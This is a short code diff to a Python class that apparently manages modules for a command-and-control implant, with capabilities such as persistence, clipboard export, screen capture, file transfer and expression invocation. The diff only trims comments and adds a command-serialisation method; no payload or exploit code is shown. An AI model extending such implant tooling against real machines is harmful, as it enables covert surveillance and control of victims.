@@ -18,14 +18,14 @@ class ImplantFunctionality:
         self.module_list = []
         self.module_list.append(DownloadFile())
         self.module_list.append(UploadFile())
-        self.module_list.append(PlayAudio())            # Early PoC - Needs MemoryStream to remove locally saved files.
+        self.module_list.append(PlayAudio())
         self.module_list.append(EnablePersistence())
         self.module_list.append(ExportClipboard())
         self.module_list.append(SystemInfo())
         self.module_list.append(LoadModule())
         self.module_list.append(InvokeExpression())
         self.module_list.append(GetLoadedModules())
-        self.module_list.append(ScreenCapture())        # Beta
+        self.module_list.append(ScreenCapture())
 
     def get_list_of_implant_text(self):
         implant_text = []
@@ -76,3 +76,12 @@ class ImplantFunctionality:
             if implant_module.type == command_dict['type']:
                 return implant_module.pre_process_command(command_dict['args'])
 
+    def create_module_data_string(self, command_dict):
+        for implant_module in self.module_list:
+            if implant_module.type == command_dict.log_entry['type']:
+
+                arg_string = implant_module.create_module_data_string(command_dict.log_entry)
+
+                to_ret = f"{command_dict.log_entry['type']}{command_dict.command_id}{arg_string}"
+                # print(f"TESTING:\ndict: {command_dict.__dict__}\narg:  {arg_string}\nret:  {to_ret}")
+                return to_ret
